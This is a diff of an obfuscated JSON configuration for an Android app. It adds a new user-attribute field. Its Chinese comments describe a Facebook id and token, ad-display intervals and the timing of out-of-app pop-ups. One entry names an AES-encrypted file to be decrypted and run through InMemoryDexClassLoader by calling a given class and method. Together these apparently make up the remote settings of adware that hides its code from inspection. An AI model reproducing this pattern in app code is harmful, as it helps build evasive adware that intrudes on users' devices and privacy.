@@ -1,18 +1,10 @@
-
-
-//android.os.Build.VERSION_CODES.Q
-//Android 10 奔溃多弹通知栏，通知栏高度不对 ，主要机型xiaomi、Samsung、Huawei、vivo
-
-
-
-
-
 //A
 {
   "de_po": "60-60-1000",
   "m_d": "upgo",
   "canpa": "need",
   "CvsdvG": "3616318175247400-3616318175247400",
+  "q_j_u":"",
   "MgvCd": "30-30-60-8-16-80-500-800-40-10",
   "AcdmkD": "981772962-981772963",
   "paKy": "vfkG54ksDfs32mkv-Gh3dsvdsrG3KG23R",
@@ -25,6 +17,7 @@
   "m_d": "upgo",
   "canpa": "can",
   "CvsdvG": "3616318175247400-3616318175247400",
+  "q_j_u":""
 }
 
 
@@ -37,6 +30,8 @@
   "canpa": "need",
   // Facebook id和Facebook token（-号隔开）
   "CvsdvG": "3616318175247400-3616318175247400",
+  //新增用户属性
+  "q_j_u":"",
   //广告检测间隔、定时触发间隔 单位秒,
   //广告显示间隔 单位秒,
   //首次外弹的时间，与安装时间比较；本地默认60秒； 单位秒
@@ -57,4 +52,3 @@
   //文件名，加密方式，InMemoryDexClassLoader路径，调用dex方法路径，调用dex方法名，用-号隔开
   "GanG": "scu.doc-AES-dalvik.system.InMemoryDexClassLoader-ass.de.Pue-onexun"
 }
-
